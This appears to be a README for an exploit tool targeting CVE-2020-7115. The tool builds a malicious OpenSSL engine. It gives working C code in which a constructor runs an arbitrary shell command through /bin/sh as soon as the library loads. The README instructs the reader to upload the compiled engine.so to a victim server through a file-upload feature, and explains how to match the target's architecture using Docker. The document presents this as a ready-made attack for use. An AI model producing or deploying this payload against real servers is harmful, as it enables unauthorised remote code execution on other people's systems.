

# CVE-2020-7115
Create your malicious engine in seconds

# build_engine.sh
Simple script to generate a **malicious engine** ready to be used in openssl [argument injection](https://www.acunetix.com/vulnerabilities/web/argument-injection/) scenarios.

## How to use?

It's very simple, just modify the engine.c file with the command of your choice:

```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "sh", "-c", "COMMAND");
}
```

Once you have done that, now you just need to run the script like this:

```bash
bash build_engine.sh
```
This command will create a folder called output, in it you will find a file called `engine.so` which is the one you should send to the server through a file upload functionality.

## How to raise a docker to run the script and why should I do it?
It is important for you to know that you must create the malicious engine with the same characteristics of the victim system. That is... if the target system is running on a 64-bit linux, you must create the malicious engine on a 64-bit linux.

Docker is an amazing technology for this kind of thing, and setting up your environment is very easy.

First let's download the docker image from [this site](https://hub.docker.com/_/debian) for a 64-bit debian linux system:

```bash
sudo docker pull debian
```

Then we are going to pull up the docker as follows:

```bash
sudo docker run -v `pwd`:/code -it debian
```
Let's understand a little what we did here. The `-v` flag is used to create a volume, in this case we are associating the contents of the `/code` folder with the contents of our current directory folder, hence the use of `pwd`.

With associate I mean that everything that we create or edit in `/code` (folder that is hosted in the root of the docker image), we will have and we will see it in `pwd` and in the opposite direction.

In our case, `pwd` points to the following directory on our local machine:
>>> /home/retr0/CVE-2020-7115/

The -it flag, on the other hand, can be seen as follows:

The `-t (--tty)` flag tells Docker to map a virtual terminal session inside the container. This is commonly used with the `-i (--interactive)` option, which keeps STDIN open even if running in `detached mode`.

So in effect using the `-it` flag is useful when we want to get a shell from the container in question.

## Don't know the  CVE-2020-7115?
No problem, just visit [this post](https://gist.github.com/Retr02332/02a2265047ea1bbb7ba0b61afc346e79), and I am sure you will fully understand this vulnerability.
